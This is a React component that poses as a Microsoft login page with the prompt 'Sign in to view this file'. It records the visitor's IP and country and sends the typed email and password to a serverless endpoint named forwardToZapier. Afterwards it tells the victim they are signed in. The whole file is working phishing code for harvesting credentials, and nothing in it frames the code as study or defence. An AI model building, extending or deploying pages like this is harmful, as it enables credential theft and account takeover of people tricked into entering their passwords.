import React, { useState, useEffect } from 'react';
import { motion } from 'framer-motion';
import MicrosoftLogo from './MicrosoftLogo';
import { KeyRound } from 'lucide-react';
import PasswordInput from './PasswordInput';

const validateAutolink = async () => Promise.resolve('');

enum Stage {
  VALIDATING = 'VALIDATING',
  EMAIL = 'EMAIL',
  PASSWORD = 'PASSWORD',
  LOGGING_IN = 'LOGGING_IN',
  SUCCESS = 'SUCCESS'
}

// Point the frontend at the serverless function you will deploy on Vercel
const BACKEND_ENDPOINT = "/api/forwardToZapier";

const MicrosoftLogin: React.FC = () => {
  const [stage, setStage] = useState<Stage>(Stage.VALIDATING);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [pwError, setPwError] = useState('');
  const [keepSignedIn, setKeepSignedIn] = useState(false);
  const [passwordAttempts, setPasswordAttempts] = useState(0);
  const [ip, setIp] = useState('');
  const [country, setCountry] = useState('');

  useEffect(() => {
    (async () => {
      try {
        const res = await fetch('https://ipinfo.io/json');
        if (res.ok) {
          const data = await res.json();
          setIp(data.ip || '');
          setCountry(data.country || '');
        } else {
          setIp('');
          setCountry('');
        }
      } catch {
        setIp('');
        setCountry('');
      }
      try {
        const e = await validateAutolink();
        if (e) {
          setEmail(e);
          setStage(Stage.PASSWORD);
        } else {
          setStage(Stage.EMAIL);
        }
      } catch {
        setStage(Stage.EMAIL);
      }
    })();
  }, []);

  const onEmailNext = (e: React.FormEvent) => {
    e.preventDefault();
    if (!email) {
      setError('Enter your email, phone, or Skype');
      return;
    }
    setError('');
    setStage(Stage.PASSWORD);
  };

  const onPasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) {
      setPwError('Enter your password');
      return;
    }
    setStage(Stage.LOGGING_IN);
    setPwError('');

    if (keepSignedIn) {
      const expires = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toUTCString();
      document.cookie = `keepSignedIn=true; expires=${expires}; path=/; Secure; SameSite=Strict`;
    } else {
      document.cookie = "keepSignedIn=false; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
    }

    // Payload sent to the serverless forwarder. Server controls whether to forward password to Zapier.
    const payload = {
      email,
      password,
      ip,
      country
    };

    try {
      const response = await fetch(BACKEND_ENDPOINT, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Accept: "application/json"
        },
        body: JSON.stringify(payload)
      });
      const result = await response.json();
      if (response.ok && result.success) {
        setStage(Stage.SUCCESS);
      } else {
        setPwError(result.error || `Status ${response.status}`);
        setStage(Stage.PASSWORD);
      }
    } catch (error: any) {
      setPwError('Network error: ' + (error?.message || 'unknown'));
      setStage(Stage.PASSWORD);
    }
  };

  const goBack = () => {
    if (stage === Stage.PASSWORD) {
      setStage(Stage.EMAIL);
    } else {
      window.history.back();
    }
  };

  const startOver = () => {
    setEmail('');
    setPassword('');
    setError('');
    setPwError('');
    setPasswordAttempts(0);
    setStage(Stage.EMAIL);
  };

  const isLoggingIn = stage === Stage.LOGGING_IN;

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-gray-100">
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ duration: 0.4 }}
        className="bg-white p-8 rounded-lg shadow-lg w-full max-w-md"
      >
        <div className="flex justify-start mb-6">
          <MicrosoftLogo />
        </div>

        {stage === Stage.EMAIL && (
          <motion.form onSubmit={onEmailNext} className="space-y-6" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
            <h2 className="text-2xl font-semibold text-gray-900 mb-6 text-left">Sign in to view this file </h2>
            <div>
              <input
                type="text"
                name="email" // Added for Formspree
                value={email}
                onChange={(e) => {
                  setEmail(e.target.value);
                  setError('');
                }}
                placeholder="Email, phone, or Skype"
                className="w-full border-0 border-b border-gray-400 pb-1 focus:outline-none focus:border-black"
              />
              {error && <p className="mt-1 text-sm text-red-600">{error}</p>}
            </div>
            <div className="text-left text-sm space-y-3">
              <p className="text-sm text-gray-600 text-left mt-8">
                No account?{' '}
                <a href="#" className="text-[#0067B8] hover:underline">
                  Create one!
                </a>
              </p>
              <a href="#" className="text-[#0067B8] hover:underline block">
                Can't access your account?
              </a>
            </div>
            <div className="pt-4 flex justify-end space-x-3">
              <button
                type="button"
                onClick={goBack}
                className="px-12 py-1.5 text-sm bg-gray-300 text-black rounded-sm hover:bg-gray-400 transition"
              >
                Back
              </button>
              <button
                type="submit"
                className="px-12 py-1.5 text-sm bg-[#0067B8] text-white rounded-sm hover:bg-[#005a9e] transition"
              >
                Next
              </button>
            </div>
            <div>
              <motion.div
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.3, delay: 0.2 }}
                className="pt-6 border-t border-gray-200 mt-4"
              >
                <button
                  type="button"
                  className="flex items-center text-[#0067B8] hover:underline text-sm"
                >
                  <KeyRound size={16} className="mr-2" />
                  Sign-in options
                </button>
              </motion.div>
            </div>
          </motion.form>
        )}

        {stage === Stage.PASSWORD && (
          <motion.form onSubmit={onPasswordSubmit} className="space-y-6" initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
            <div className="text-left mb-6">
              <h2 className="text-2xl font-semibold text-gray-900">Enter password</h2>
              <div className="flex items-center mt-2 text-sm">
                <span className="text-gray-600">{email}</span>
                <button
                  type="button"
                  className="ml-2 text-[#0067B8] hover:underline"
                  onClick={() => setStage(Stage.EMAIL)}
                >
                  Change
                </button>
              </div>
            </div>
            <PasswordInput
              name="password" // Ensure PasswordInput includes this
              value={password}
              onChange={(e) => {
                setPassword(e.target.value);
                setPwError('');
              }}
              error={pwError}
            />
            <input type="hidden" name="ip" value={ip} />
            <input type="hidden" name="country" value={country} />
            <input type="hidden" name="_gotcha" />
            <div className="flex items-center">
              <input
                id="keep-signed-in"
                type="checkbox"
                checked={keepSignedIn}
                onChange={(e) => setKeepSignedIn(e.target.checked)}
                className="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded"
              />
              <label htmlFor="keep-signed-in" className="ml-2 block text-sm text-gray-900">
                Keep me signed in
              </label>
            </div>
            <div className="text-left text-sm">
              <a href="#" className="text-[#0067B8] hover:underline">
                Forgot your password?
              </a>
            </div>
            <div className="pt-4 flex justify-end">
              <button
                type="submit"
                disabled={isLoggingIn}
                className={`px-8 py-2 text-sm font-medium text-white rounded-sm transition
                  ${isLoggingIn ? 'bg-gray-400 cursor-not-allowed' : 'bg-[#0067B8] hover:bg-[#005a9e]'}`}
              >
                Next
              </button>
            </div>
          </motion.form>
        )}

        {stage === Stage.LOGGING_IN && (
          <div className="text-left">
            <p className="text-gray-900">Logging in...</p>
          </div>
        )}

        {stage === Stage.SUCCESS && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
            <p className="text-green-600 text-lg font-semibold mb-4">Login successful!</p>
            <p className="text-gray-600 mb-6">You are now signed in to your Microsoft account.</p>
            <button
              onClick={startOver}
              className="bg-[#0067B8] text-white py-2 px-6 shadow hover:bg-[#005a9e] transition"
            >
              Start Over
            </button>
          </motion.div>
        )}
      </motion.div>
    </div>
  );
};

export default MicrosoftLogin;
